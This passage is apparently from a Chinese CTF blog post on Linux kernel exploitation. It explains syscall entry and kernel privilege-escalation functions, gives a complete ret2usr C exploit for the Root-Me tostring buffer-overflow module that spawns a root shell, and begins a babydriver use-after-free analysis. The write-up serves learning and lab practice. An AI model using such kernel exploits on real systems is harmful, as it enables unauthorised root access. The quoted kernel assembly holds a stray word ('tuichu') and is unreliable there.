<code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href=http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S>代码</a> 如下:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ENTRY(entry_SYSCALL_64)
</span></span><span class=line><span class=cl> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
</span></span><span class=line><span class=cl> SWAPGS_UNSAFE_STACK
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl> /* 保存栈值，并设置内核栈 */
</span></span><span class=line><span class=cl> movq %rsp, PER_CPU_VAR(rsp_scratch)
</span></span><span class=line><span class=cl> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>/* 通过push保存寄存器值，形成一个pt_regs结构 */
</span></span><span class=line><span class=cl>/* Construct struct pt_regs on stack */
</span></span><span class=line><span class=cl>pushq  $__USER_DS      /* pt_regs-&gt;ss */
</span></span><span class=line><span class=cl>pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */
</span></span><span class=line><span class=cl>pushq  %r11             /* pt_regs-&gt;flags */
</span></span><span class=line><span class=cl>pushq  $__USER_CS      /* pt_regs-&gt;cs */
</span></span><span class=line><span class=cl>pushq  %rcx             /* pt_regs-&gt;ip */
</span></span><span class=line><span class=cl>pushq  %rax             /* pt_regs-&gt;orig_ax */
</span></span><span class=line><span class=cl>pushq  %rdi             /* pt_regs-&gt;di */
</span></span><span class=line><span class=cl>pushq  %rsi             /* pt_regs-&gt;si */
</span></span><span class=line><span class=cl>pushq  %rdx             /* pt_regs-&gt;dx */
</span></span><span class=line><span class=cl>pushq  %rcx tuichu    /* pt_regs-&gt;cx */
</span></span><span class=line><span class=cl>pushq  $-ENOSYS        /* pt_regs-&gt;ax */
</span></span><span class=line><span class=cl>pushq  %r8              /* pt_regs-&gt;r8 */
</span></span><span class=line><span class=cl>pushq  %r9              /* pt_regs-&gt;r9 */
</span></span><span class=line><span class=cl>pushq  %r10             /* pt_regs-&gt;r10 */
</span></span><span class=line><span class=cl>pushq  %r11             /* pt_regs-&gt;r11 */
</span></span><span class=line><span class=cl>sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */
</span></span></code></pre></td></tr></table></div></div><ol start=4><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h4 id=kernel-space-to-user-space>kernel space to user space<a hidden class=anchor aria-hidden=true href=#kernel-space-to-user-space>#</a></h4><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><blockquote><p>iretq中q后缀，是quadra word的意思，也就是说64位指令。还存在iretd, iretw等。</p></blockquote><h3 id=内核态函数3>内核态函数[3]<a hidden class=anchor aria-hidden=true href=#内核态函数3>#</a></h3><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li>printf() -> printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li><li>memcpy() -> copy_from_user()/copy_to_user()
copy_from_user() 实现了将用户空间的数据传送到内核空间
copy_to_user() 实现了将内核空间的数据传送到用户空间</li><li>malloc() -> kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li><li>free() -> kfree()，同 kmalloc()</li></ul><p><strong>提权函数</strong></p><p>kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。通常需要root权限查看。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo grep commit_creds /proc/kallsyms
</span></span></code></pre></td></tr></table></div></div><p><code>struct cred</code> 每个进程都有这么个结构，如果能修改，也就获得了对应权限。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>cred</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>atomic_t</span>	<span class=n>usage</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef CONFIG_DEBUG_CREDENTIALS
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=kt>atomic_t</span>	<span class=n>subscribers</span><span class=p>;</span>	<span class=cm>/* number of processes subscribed */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>		<span class=o>*</span><span class=n>put_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>	<span class=n>magic</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#define CRED_MAGIC	0x43736564
</span></span></span><span class=line><span class=cl><span class=cp>#define CRED_MAGIC_DEAD	0x44656144
</span></span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=kt>kuid_t</span>		<span class=n>uid</span><span class=p>;</span>		<span class=cm>/* real UID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kgid_t</span>		<span class=n>gid</span><span class=p>;</span>		<span class=cm>/* real GID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kuid_t</span>		<span class=n>suid</span><span class=p>;</span>		<span class=cm>/* saved UID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kgid_t</span>		<span class=n>sgid</span><span class=p>;</span>		<span class=cm>/* saved GID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kuid_t</span>		<span class=n>euid</span><span class=p>;</span>		<span class=cm>/* effective UID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kgid_t</span>		<span class=n>egid</span><span class=p>;</span>		<span class=cm>/* effective GID of the task */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kuid_t</span>		<span class=n>fsuid</span><span class=p>;</span>		<span class=cm>/* UID for VFS ops */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kgid_t</span>		<span class=n>fsgid</span><span class=p>;</span>		<span class=cm>/* GID for VFS ops */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>	<span class=n>securebits</span><span class=p>;</span>	<span class=cm>/* SUID-less security management */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kernel_cap_t</span>	<span class=n>cap_inheritable</span><span class=p>;</span> <span class=cm>/* caps our children can inherit */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kernel_cap_t</span>	<span class=n>cap_permitted</span><span class=p>;</span>	<span class=cm>/* caps we&#39;re permitted */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kernel_cap_t</span>	<span class=n>cap_effective</span><span class=p>;</span>	<span class=cm>/* caps we can actually use */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kernel_cap_t</span>	<span class=n>cap_bset</span><span class=p>;</span>	<span class=cm>/* capability bounding set */</span>
</span></span><span class=line><span class=cl>	<span class=kt>kernel_cap_t</span>	<span class=n>cap_ambient</span><span class=p>;</span>	<span class=cm>/* Ambient capability set */</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef CONFIG_KEYS
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=kt>unsigned</span> <span class=kt>char</span>	<span class=n>jit_keyring</span><span class=p>;</span>	<span class=cm>/* default keyring to attach requested
</span></span></span><span class=line><span class=cl><span class=cm>					 * keys to */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>key</span> <span class=n>__rcu</span> <span class=o>*</span><span class=n>session_keyring</span><span class=p>;</span> <span class=cm>/* keyring inherited over fork */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>process_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this process */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>thread_keyring</span><span class=p>;</span> <span class=cm>/* keyring private to this thread */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>key</span>	<span class=o>*</span><span class=n>request_key_auth</span><span class=p>;</span> <span class=cm>/* assumed request_key authority */</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp>#ifdef CONFIG_SECURITY
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=kt>void</span>		<span class=o>*</span><span class=n>security</span><span class=p>;</span>	<span class=cm>/* subjective LSM security */</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>	<span class=cm>/* real user ID subscription */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>user_namespace</span> <span class=o>*</span><span class=n>user_ns</span><span class=p>;</span> <span class=cm>/* user_ns the caps and keyrings are relative to. */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>group_info</span> <span class=o>*</span><span class=n>group_info</span><span class=p>;</span>	<span class=cm>/* supplementary groups for euid/fsgid */</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>rcu_head</span>	<span class=n>rcu</span><span class=p>;</span>		<span class=cm>/* RCU deletion hook */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>__randomize_layout</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=题目>题目<a hidden class=anchor aria-hidden=true href=#题目>#</a></h2><h3 id=ret2usr--rootme-buffer-overflow-basic-1httpswwwroot-meorgenchallengesapp-systemlinkern-x86-buffer-overflow-basic-1>ret2usr | <a href=https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1>Rootme buffer overflow basic 1</a><a hidden class=anchor aria-hidden=true href=#ret2usr--rootme-buffer-overflow-basic-1httpswwwroot-meorgenchallengesapp-systemlinkern-x86-buffer-overflow-basic-1>#</a></h3><p>题目有以下几个文件：</p><ul><li>bzImage：内核文件</li><li>ch1.c：模块源代码</li><li>initramfs.img：用cpio打包成的初始文件系统</li><li>passwd.img：flag所在，在qemu中普通用户无法读取</li><li>run：set-uid程序，运行._start_vm启动qemu</li><li>._start_vm：启动脚本</li></ul><p>虚拟机中<code>/init</code>文件，在Linux启动的最后一步将会执行此脚本。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># 挂载 devtmpfs 类型的文件系统，设备名设置为 none，挂载目录为 /dev</span>
</span></span><span class=line><span class=cl><span class=c1># devtmpfs 的功用是在 Linux 核心启动早期建立一个初步的 /dev，</span>
</span></span><span class=line><span class=cl><span class=c1># 令一般启动程序不用等待 udev，缩短 GNU/Linux 的开机时间。[4]</span>
</span></span><span class=line><span class=cl>mount -t devtmpfs none /dev
</span></span><span class=line><span class=cl>mount -t proc proc /proc
</span></span><span class=line><span class=cl>mount -t sysfs sysfs /sys
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># flag</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>mkdir -p /passwd
</span></span><span class=line><span class=cl>mount -t ext2 -o ro /dev/sda /passwd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># share</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># 挂载与主机共享的文件夹</span>
</span></span><span class=line><span class=cl>mkdir -p /mnt/share
</span></span><span class=line><span class=cl>mount -t 9p -o <span class=nv>trans</span><span class=o>=</span>virtio rootme /mnt/share/ -oversion<span class=o>=</span>9p2000.L,posixacl,sync
</span></span><span class=line><span class=cl>chmod <span class=m>777</span> /mnt/share/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># module</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># 安装漏洞模块</span>
</span></span><span class=line><span class=cl>insmod /lib/modules/*/rootme/*.ko
</span></span><span class=line><span class=cl>chmod <span class=m>666</span> /dev/tostring 
</span></span><span class=line><span class=cl><span class=c1># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/vm/mmap_min_addr
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># shell</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>cat /etc/issue
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>ENV</span><span class=o>=</span>/etc/profile
</span></span><span class=line><span class=cl>setsid cttyhack setuidgid <span class=m>1000</span> sh
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>umount /proc
</span></span><span class=line><span class=cl>umount /sys
</span></span><span class=line><span class=cl>umount /dev
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>poweroff -f
</span></span></code></pre></td></tr></table></div></div><p>在tostring模块中可以发现，tostring结构中<code>tostring_stack</code>存在溢出的可能，在<code>tostring_write</code>中并未作出限制。<code>tostring_stack</code>后面就是一个函数指针。同时该kernel并没有随机化，通过<code>/proc/kallsyms</code>获取<code>prepare_kernel_cred</code>和<code>commit_creds</code>函数的地址。</p><p>调试中可以用条件断点<code>b tostring_write if (int)tostring==64</code>比较方便。</p><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/LinKern_x86-Buffer_overflow_basic_1/exp.c>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>eip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>eflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>esp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=nf>__attribute__</span><span class=p>((</span><span class=n>packed</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>trap_frame</span> <span class=n>tf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>getshell</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>execl</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>init_tf_work</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushl %cs;popl tf+4;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushfl;popl tf+8;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushl %esp;popl tf+12;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;pushl %ss;popl tf+16;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=p>.</span><span class=n>eip</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>getshell</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tf</span><span class=p>.</span><span class=n>esp</span> <span class=o>-=</span> <span class=mi>1024</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define KERNCALL __attribute__((regparm(3)))
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>prepare_kernel_cred</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xc10711f0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=n>commit_creds</span><span class=p>)(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=n>KERNCALL</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xc1070e80</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>payload</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>commit_creds</span><span class=p>(</span><span class=nf>prepare_kernel_cred</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;mov $tf, %esp;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;iret;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>recv</span><span class=p>[</span><span class=mi>255</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>padding</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;AAAAAAAA&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>eip</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>init_tf_work</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/tostring&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x40</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>padding</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>padding</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=kt>void</span><span class=o>**</span><span class=p>)(</span><span class=n>eip</span><span class=p>))</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>payload</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>eip</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>eip</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>recv</span><span class=p>,</span> <span class=mi>255</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=uaf--rop--ciscn2017-babydriver>UAF & ROP | CISCN2017 babydriver<a hidden class=anchor aria-hidden=true href=#uaf--rop--ciscn2017-babydriver>#</a></h3><h4 id=ioctl>ioctl<a hidden class=anchor aria-hidden=true href=#ioctl>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>ioctl</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>request</span><span class=p>,</span> <span class=p>...);</span>
</span></span></code></pre></td></tr></table></div></div><p>第一个参数是文件描述符，第二个是程序对设备的控制指令，后面则是指令的补充参数。</p><p>对于Linux，一切皆文件。而Linux提供的读写文件的函数（read, write, lseek等）对于许多的设备不好进行控制，所以提供了ioctl函数。request就是设备驱动程序提供的控制指令。</p><h4 id=分析>分析<a hidden class=anchor aria-hidden=true href=#分析>#</a></h4><p><code>babydriver_init</code>，<code>babydriver_exit</code>是常规的创建和销毁过程。</p><p><code>babyioctl</code>定义了一个ioctl指令来分配指定大小的buf。</p><p><code>babyopen</code>默认分配一个64字节的buf。<code>kmem_cache_alloc_trace</code>似乎是<code>kmalloc</code>优化的结果，还不了解后续再研究。<a href=https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/slab.h#L458>src</a></p><p><code>babyread</code>/<code>babywrite</code> 从buf读取数据/往buf写入数据，都对大小进行了验证，不存在溢出。</p><p>漏洞点在于该符号设备全局共享一个buf，所以同时打开两次，这两次共享一个buf，释放其中一个就发生了UAF。</p><h4 id=exploit1>exploit1<a hidden class=anchor aria-hidden=true href=#exploit1>#</a></h4><p>打开两次设备，使用ioctl控制buf为<code>struct cred</code>的大小，然后close其中一次打开，另一次打开就指向了一块已经释放的区域，fork产生的新进程就会分配得到该区块用来存储<code>cred</code>，通过另一次打开的设备进行覆写改变进程uid、gid，就获得了root权限。</p><p>在这里计算<code>struct 